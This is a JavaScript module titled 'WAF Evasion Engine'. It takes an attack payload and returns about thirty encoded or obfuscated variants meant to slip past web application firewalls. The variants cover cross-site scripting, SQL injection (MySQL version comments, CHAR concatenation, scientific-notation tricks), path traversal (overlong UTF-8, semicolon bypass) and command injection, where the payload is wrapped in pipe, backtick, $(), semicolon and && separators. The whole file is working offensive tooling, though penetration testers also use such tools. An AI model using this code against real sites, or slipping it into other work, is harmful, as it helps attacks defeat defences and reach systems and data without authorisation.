/**
 * WAF Evasion Engine
 * 30+ encoding/obfuscation variants to bypass Web Application Firewalls.
 * Each function takes a payload string and returns encoded variants.
 */

/**
 * URL encoding variants
 */
function urlEncode(payload) {
  return payload.replace(/[^A-Za-z0-9]/g, c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0'));
}

function doubleUrlEncode(payload) {
  return urlEncode(urlEncode(payload));
}

function partialUrlEncode(payload) {
  // Only encode special chars that WAFs look for
  return payload.replace(/[<>"'&;|`(){}]/g, c => '%' + c.charCodeAt(0).toString(16));
}

/**
 * Unicode/UTF-8 variants
 */
function unicodeEncode(payload) {
  return payload.split('').map(c => c.charCodeAt(0) > 127 ? c : `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

function overlongUtf8(payload) {
  // Overlong UTF-8 encoding for / and . (path traversal bypass)
  return payload.replace(/\//g, '%c0%af').replace(/\./g, '%c0%ae');
}

function utf16Encode(payload) {
  return payload.split('').map(c => `%u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

/**
 * Case manipulation
 */
function mixedCase(payload) {
  return payload.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
}

function randomCase(payload) {
  return payload.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
}

/**
 * Whitespace and comment injection
 */
function sqlCommentBypass(payload) {
  return payload.replace(/ /g, '/**/');
}

function tabReplace(payload) {
  return payload.replace(/ /g, '\t');
}

function newlineInject(payload) {
  return payload.replace(/ /g, '%0a');
}

function nullByteInject(payload) {
  return payload + '%00';
}

/**
 * HTML entity encoding
 */
function htmlEntityEncode(payload) {
  return payload.replace(/[<>"'&]/g, c => `&#${c.charCodeAt(0)};`);
}

function htmlHexEncode(payload) {
  return payload.replace(/[<>"'&]/g, c => `&#x${c.charCodeAt(0).toString(16)};`);
}

function htmlEntityNoSemicolon(payload) {
  return payload.replace(/[<>"'&]/g, c => `&#${c.charCodeAt(0)}`);
}

/**
 * JavaScript-specific evasion
 */
function jsHexEscape(payload) {
  return payload.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
}

function jsOctalEscape(payload) {
  return payload.split('').map(c => `\\${c.charCodeAt(0).toString(8)}`).join('');
}

function jsTemplateString(payload) {
  return '`' + payload + '`';
}

function jsStringConcat(payload) {
  // Split into char concat: 'a'+'l'+'e'+'r'+'t'
  return payload.split('').map(c => `'${c}'`).join('+');
}

/**
 * SQL-specific evasion
 */
function sqlHexEncode(payload) {
  return '0x' + Buffer.from(payload).toString('hex');
}

function sqlCharConcat(payload) {
  return 'CHAR(' + payload.split('').map(c => c.charCodeAt(0)).join(',') + ')';
}

function sqlVersionComment(payload) {
  // MySQL version-specific comment: /*!50000 UNION*/
  return payload.replace(/(UNION|SELECT|FROM|WHERE)/gi, '/*!50000 $1*/');
}

function sqlScientificNotation(payload) {
  // 1e0UNION → bypasses space detection
  return payload.replace(/ (UNION|SELECT|FROM|WHERE)/gi, ' 1e0$1');
}

/**
 * Path traversal evasion
 */
function dotSlashVariants(payload) {
  return payload.replace(/\.\.\//g, '..%2f');
}

function backslashVariant(payload) {
  return payload.replace(/\//g, '\\');
}

function semicolonBypass(payload) {
  return payload.replace(/\.\.\//g, '..;/');
}

/**
 * Header-based evasion
 */
function chunkedTransfer(payload) {
  // Hint: use Transfer-Encoding: chunked to split payload
  const hex = payload.length.toString(16);
  return `${hex}\r\n${payload}\r\n0\r\n\r\n`;
}

/**
 * Generate all encoding variants for a payload.
 * @param {string} payload - Original payload
 * @param {string} context - 'xss' | 'sqli' | 'path' | 'cmdi' | 'all'
 * @returns {Array<{ name: string, payload: string }>}
 */
export function generateVariants(payload, context = 'all') {
  const variants = [
    { name: 'original', payload },
    { name: 'url_encode', payload: urlEncode(payload) },
    { name: 'double_url_encode', payload: doubleUrlEncode(payload) },
    { name: 'partial_url_encode', payload: partialUrlEncode(payload) },
    { name: 'unicode', payload: unicodeEncode(payload) },
    { name: 'mixed_case', payload: mixedCase(payload) },
    { name: 'random_case', payload: randomCase(payload) },
    { name: 'null_byte', payload: nullByteInject(payload) },
    { name: 'tab_replace', payload: tabReplace(payload) },
    { name: 'newline_inject', payload: newlineInject(payload) },
  ];

  if (context === 'xss' || context === 'all') {
    variants.push(
      { name: 'html_entity', payload: htmlEntityEncode(payload) },
      { name: 'html_hex', payload: htmlHexEncode(payload) },
      { name: 'html_no_semi', payload: htmlEntityNoSemicolon(payload) },
      { name: 'js_hex', payload: jsHexEscape(payload) },
      { name: 'js_octal', payload: jsOctalEscape(payload) },
      { name: 'js_template', payload: jsTemplateString(payload) },
      { name: 'js_concat', payload: jsStringConcat(payload) },
    );
  }

  if (context === 'sqli' || context === 'all') {
    variants.push(
      { name: 'sql_comment', payload: sqlCommentBypass(payload) },
      { name: 'sql_hex', payload: sqlHexEncode(payload) },
      { name: 'sql_char', payload: sqlCharConcat(payload) },
      { name: 'sql_version_comment', payload: sqlVersionComment(payload) },
      { name: 'sql_scientific', payload: sqlScientificNotation(payload) },
    );
  }

  if (context === 'path' || context === 'all') {
    variants.push(
      { name: 'overlong_utf8', payload: overlongUtf8(payload) },
      { name: 'utf16', payload: utf16Encode(payload) },
      { name: 'dot_slash_encode', payload: dotSlashVariants(payload) },
      { name: 'backslash', payload: backslashVariant(payload) },
      { name: 'semicolon_bypass', payload: semicolonBypass(payload) },
    );
  }

  if (context === 'cmdi' || context === 'all') {
    variants.push(
      { name: 'newline_cmd', payload: `%0a${payload}` },
      { name: 'pipe_cmd', payload: `|${payload}` },
      { name: 'backtick_cmd', payload: '`' + payload + '`' },
      { name: 'dollar_cmd', payload: `$(${payload})` },
      { name: 'semicolon_cmd', payload: `;${payload}` },
      { name: 'and_cmd', payload: `&&${payload}` },
    );
  }

  return variants;
}

/**
 * Get count of available variants for a context.
 */
export function getVariantCount(context = 'all') {
  return generateVariants('test', context).length;
}

export default { generateVariants, getVariantCount };
